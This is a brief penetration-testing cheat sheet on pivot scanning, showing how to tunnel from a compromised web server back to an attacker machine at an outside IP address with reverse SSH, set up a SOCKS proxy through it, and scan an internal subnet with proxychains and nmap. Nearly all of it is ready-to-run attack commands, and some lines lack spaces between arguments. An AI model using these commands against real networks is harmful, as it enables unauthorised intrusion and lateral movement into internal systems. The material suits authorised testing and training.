Pivot scanning

Scan internal network through compromised (web)server

-f run ssh in background
-N do not execute a remote command(useful for port forwarding)


Example

attacker machine
webserver
hax0r is user on webserver

root@adminsql:/var/www#ssh -f -N -R 2222:127.0.0.1:22root@208.68.234.100
root@kali:~#ssh -f -N -D 127.0.0.1:8080-p 2222 hax0r@127.0.0.1
configure proxychains to use 127.0.0.1:8080
root@kali:~#proxychains nmap --top-ports=20 -sT -Pn 172.16.40.0/24
